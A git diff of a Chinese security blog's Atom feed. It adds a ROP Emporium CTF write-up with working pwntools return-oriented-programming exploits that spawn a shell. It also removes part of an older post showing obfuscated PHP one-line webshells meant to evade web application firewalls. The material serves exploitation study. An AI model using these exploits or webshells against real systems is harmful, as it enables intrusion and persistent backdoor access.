@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://iosmosis.github.io/"/>
-  <updated>2018-07-11T18:34:56.058Z</updated>
+  <updated>2018-07-12T17:08:56.803Z</updated>
   <id>http://iosmosis.github.io/</id>
   
   <author>
@@ -16,11 +16,205 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>ROPEmporium-WriteUp</title>
+    <link href="http://iosmosis.github.io/2018/07/12/ROPEmporium-WriteUp/"/>
+    <id>http://iosmosis.github.io/2018/07/12/ROPEmporium-WriteUp/</id>
+    <published>2018-07-12T09:35:36.000Z</published>
+    <updated>2018-07-12T17:08:56.803Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近在看堆系列 最近的wp都是大家有疑惑 我自己也有点不明白的题目 所以再次记录</p>
+<h2 id="write432"><a href="#write432" class="headerlink" title="write432"></a>write432</h2><p>检查保护</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec write432
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/write432'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+</code></pre>
+<p>NX 开启</p>
+<p>载入ida分析</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"write4 by ROP Emporium"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"32bits\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nExiting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>看到main函数中调用了一个pwnme() 猜测漏洞应该在此</p>
+<p>跟进查看pwnme</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>
+
+  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Go ahead and give me the string already!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在漏洞</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>程序没有提供shell 但是调用了system</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">usefulFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/ls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>这里调用/bin/ls  但是我们想要的是/bin/sh  所以我们要利用rop想办法构造/bin/sh 并参给system</p>
+<p>尝试使用ROPgadget搜索</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write432 --only <span class="token string">"pop|ret"</span>
+Gadgets information
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+0x080486db <span class="token keyword">:</span> pop ebp <span class="token punctuation">;</span> ret
+0x080486d8 <span class="token keyword">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
+0x080483e1 <span class="token keyword">:</span> pop ebx <span class="token punctuation">;</span> ret
+0x080486da <span class="token keyword">:</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
+0x080486d9 <span class="token keyword">:</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
+0x0804819d <span class="token keyword">:</span> ret
+0x080484fe <span class="token keyword">:</span> ret 0xeac1
+
+Unique gadgets found: 7
+</code></pre>
+<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write432 --only <span class="token string">"mov|ret"</span>
+Gadgets information
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+0x08048547 <span class="token keyword">:</span> mov al, byte ptr <span class="token punctuation">[</span>0xc9010804<span class="token punctuation">]</span> <span class="token punctuation">;</span> ret
+0x08048670 <span class="token keyword">:</span> mov dword ptr <span class="token punctuation">[</span>edi<span class="token punctuation">]</span>, ebp <span class="token punctuation">;</span> ret
+0x080484b0 <span class="token keyword">:</span> mov ebx, dword ptr <span class="token punctuation">[</span>esp<span class="token punctuation">]</span> <span class="token punctuation">;</span> ret
+0x0804819d <span class="token keyword">:</span> ret
+0x080484fe <span class="token keyword">:</span> ret 0xeac1
+
+Unique gadgets found: 5
+ubuntu@ubuntu:~$ 
+<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
+</code></pre>
+<h4 id="ROP构造思路"><a href="#ROP构造思路" class="headerlink" title="ROP构造思路"></a>ROP构造思路</h4><p>先计算偏移 </p>
+<pre class=" language-python"><code class="language-python">gef➤  p<span class="token operator">/</span>d <span class="token number">0x28</span><span class="token operator">+</span><span class="token number">4</span>
+$<span class="token number">5</span> <span class="token operator">=</span> <span class="token number">44</span>
+</code></pre>
+<p>得到偏移为44</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python">pop_edi_ebp<span class="token operator">=</span><span class="token number">0x080486da</span> <span class="token comment" spellcheck="true"># pop edi ; pop ebp ; ret</span>
+mov_ret<span class="token operator">=</span><span class="token number">0x08048670</span> <span class="token comment" spellcheck="true"># mov dword ptr [edi], ebp ; ret</span>
+system_plt<span class="token operator">=</span><span class="token number">0x8048430</span>
+bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取bss段地址</span>
+<span class="token comment" spellcheck="true">#因为32位寄存器最多只能写4字节，而/bin/sh为7字节 所以我们分两次写入</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#覆盖偏移到ret + 覆盖ret为pop_edi_ebp+将bss地址写入edi+将/bin写入ebp+将ebp的内容写入bss段</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#覆盖ret到pop_edi_ebp+将bss+4的地址写入edi(因为bss段前4个地址写入了/bin所以这里为了拼接从bss+4的位置开始写入)+将/sh写入ebp+将ebp的内容写入bss段</span>
+payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#覆盖返回地址为system地址+写如system返回地址 可以任意写 +system调用参数的地址 此处存放地址为bss</span>
+</code></pre>
+<h3 id="所以可以得到exp"><a href="#所以可以得到exp" class="headerlink" title="所以可以得到exp"></a>所以可以得到exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'write432'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'write432'</span><span class="token punctuation">)</span>
+
+bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
+pop_edi_ebp<span class="token operator">=</span><span class="token number">0x080486da</span>
+mov_ret<span class="token operator">=</span><span class="token number">0x08048670</span>
+system_plt<span class="token operator">=</span><span class="token number">0x8048430</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh\x00"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
+
+payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>尝试运行</p>
+<p><img src="/2018/07/12/ROPEmporium-WriteUp/1.jpg" alt="1"></p>
+<h2 id="write464"><a href="#write464" class="headerlink" title="write464"></a>write464</h2><p>题目基本流程和上一道类似</p>
+<p>所以这里直接从ROP构造开始讲解</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python">gef➤  p<span class="token operator">/</span>d <span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span>
+$<span class="token number">2</span> <span class="token operator">=</span> <span class="token number">40</span>
+</code></pre>
+<p>所以得到偏移为40</p>
+<p>尝试用ROPgadget搜索可用的gadget</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write4 --only <span class="token string">"pop|mov|ret"</span>
+Gadgets information
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+0x0000000000400713 <span class="token keyword">:</span> mov byte ptr <span class="token punctuation">[</span>rip + 0x20096e<span class="token punctuation">]</span>, 1 <span class="token punctuation">;</span> ret
+0x0000000000400821 <span class="token keyword">:</span> mov dword ptr <span class="token punctuation">[</span>rsi<span class="token punctuation">]</span>, edi <span class="token punctuation">;</span> ret
+0x00000000004007ae <span class="token keyword">:</span> mov eax, 0 <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret
+0x0000000000400820 <span class="token keyword">:</span> mov qword ptr <span class="token punctuation">[</span>r14<span class="token punctuation">]</span>, r15 <span class="token punctuation">;</span> ret
+0x000000000040088c <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x000000000040088e <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x0000000000400890 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x0000000000400892 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret
+0x0000000000400712 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> mov byte ptr <span class="token punctuation">[</span>rip + 0x20096e<span class="token punctuation">]</span>, 1 <span class="token punctuation">;</span> ret
+0x000000000040088b <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x000000000040088f <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x00000000004006b0 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret
+0x0000000000400893 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret
+0x0000000000400891 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x000000000040088d <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
+0x00000000004005b9 <span class="token keyword">:</span> ret
+
+Unique gadgets found: 16
+</code></pre>
+<p>接下来进行构造</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python">pop_r14_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400890</span> <span class="token comment" spellcheck="true"># pop r14 ; pop r15 ; ret</span>
+mov_ret <span class="token operator">=</span> <span class="token number">0x0000000000400820</span> <span class="token comment" spellcheck="true"># mov qword ptr [r14], r15 ; ret</span>
+pop_rdi<span class="token operator">=</span><span class="token number">0x0000000000400893</span> <span class="token comment" spellcheck="true"># pop rdi ; ret</span>
+system_plt <span class="token operator">=</span><span class="token number">0x00000000004005E0</span>
+bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取bss段地址</span>
+<span class="token comment" spellcheck="true">#因为64位下可写入8字节而/bin/sh为7字节所以可以一次写入</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#覆盖偏移到ret+覆盖ret为pop_r14_r15+将bss地址写入r14+将/bin/sh\x00写入r15+将r15内容写到r14(bss)处</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#由于64位所以binsh地址参数需要放在rdi寄存器中，覆盖ret为pop_rdi+将bss地址写入rdi+写入system并调用rdi参数</span>
+</code></pre>
+<h3 id="所以可以构造exp"><a href="#所以可以构造exp" class="headerlink" title="所以可以构造exp"></a>所以可以构造exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'write4'</span><span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'write4'</span><span class="token punctuation">)</span>
+pop_r14_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400890</span>
+mov_ret <span class="token operator">=</span> <span class="token number">0x0000000000400820</span> 
+system_plt <span class="token operator">=</span><span class="token number">0x00000000004005E0</span>
+pop_rdi<span class="token operator">=</span><span class="token number">0x0000000000400893</span>
+bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>尝试运行</p>
+<p><img src="/2018/07/12/ROPEmporium-WriteUp/2.jpg" alt="2"></p>
+<p>成功获得shell</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近在看堆系列 最近的wp都是大家有疑惑 我自己也有点不明白的题目 所以再次记录&lt;/p&gt;
+&lt;h2 id=&quot;write432&quot;&gt;&lt;a href=&quot;#write432&quot; class=&quot;headerlink&quot; title=&quot;write432&quot;&gt;&lt;/a&gt;write432&lt;/h2&gt;&lt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>HITCON-Training-Writeup</title>
     <link href="http://iosmosis.github.io/2018/07/12/HITCON-Training-Writeup/"/>
     <id>http://iosmosis.github.io/2018/07/12/HITCON-Training-Writeup/</id>
     <published>2018-07-11T17:09:38.000Z</published>
-    <updated>2018-07-11T18:34:56.058Z</updated>
+    <updated>2018-07-12T11:19:06.422Z</updated>
     
     <content type="html"><![CDATA[<p>记录HITCON题目中遇到的问题</p>
 <h2 id="simplerop"><a href="#simplerop" class="headerlink" title="simplerop"></a>simplerop</h2><h4 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -140,7 +334,7 @@ payload <span class="token operator">+=</span> p32<span class="token punctuation
 sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'simplerop'</span><span class="token punctuation">)</span>
 pop_edx_ret<span class="token operator">=</span><span class="token number">0x0806e82a</span> 
 pop_eax_ret<span class="token operator">=</span><span class="token number">0x080bae06</span> 
-data_addr<span class="token operator">=</span><span class="token number">0x080ea060</span> 
+data_addr<span class="token operator">=</span><span class="token number">0x080ea060</span>  <span class="token comment" spellcheck="true">#elf.bss()获取</span>
 pop_edx_ecx_ebx_ret<span class="token operator">=</span><span class="token number">0x0806e850</span> 
 mov_ret<span class="token operator">=</span><span class="token number">0x0809a15d</span> 
 int_0x80_addr <span class="token operator">=</span> <span class="token number">0x080493e1</span> 
@@ -3745,90 +3939,6 @@ th <span class="token operator">=</span> <span class="token punctuation">{</span
       <category term="poc" scheme="http://iosmosis.github.io/tags/poc/"/>
     
       <category term="exp" scheme="http://iosmosis.github.io/tags/exp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一句话Shell编写思路</title>
-    <link href="http://iosmosis.github.io/2017/03/05/oneshell/"/>
-    <id>http://iosmosis.github.io/2017/03/05/oneshell/</id>
-    <published>2017-03-05T04:47:01.000Z</published>
-    <updated>2017-04-08T15:14:10.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路"><a href="#很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路" class="headerlink" title="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路"></a>很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路</h3><ul>
-<li><a id="more"></a>
-<the rest="" of="" contents="" |="" 余下全文="">
-
-</the></li>
-</ul>
-<h2 id="经典方式"><a href="#经典方式" class="headerlink" title="经典方式"></a>经典方式</h2><h3 id="应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如："><a href="#应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如：" class="headerlink" title="应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如："></a>应该是很常见的方法 利用 <a href="http://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="external">可变变量</a>进行赋值传值来打到过狗目的，例如：</h3><p></p><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$jg16</span><span class="token operator">=</span>base64_decode<span class="token punctuation">;</span>
-<span class="token variable">$z</span><span class="token operator">=</span><span class="token variable">$jg16</span><span class="token punctuation">(</span>YXNzZXJ0<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$z</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-这个一句话需要用到这个函数
-<span class="token comment" spellcheck="true">//base64_encode();//base64编码</span>
-<span class="token comment" spellcheck="true">//base64_decode();//base64解码</span>
-主要就是进行加密然后传值绕过对一句话的检测　这次暂不详细讲解
-</code></pre>
-<p>##system()的巧妙利用</p>
-<p>##调用system()由于在php中system函数属于系统函数所以对于一般的waf是可以通杀的 </p>
-<p></p><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>‘a’<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>‘b’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<h2 id="利用古典密码进行对shell加密"><a href="#利用古典密码进行对shell加密" class="headerlink" title="利用古典密码进行对shell加密"></a>利用古典密码进行对shell加密</h2><h3 id="在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）"><a href="#在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）" class="headerlink" title="在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）"></a>在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）</h3><p></p><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
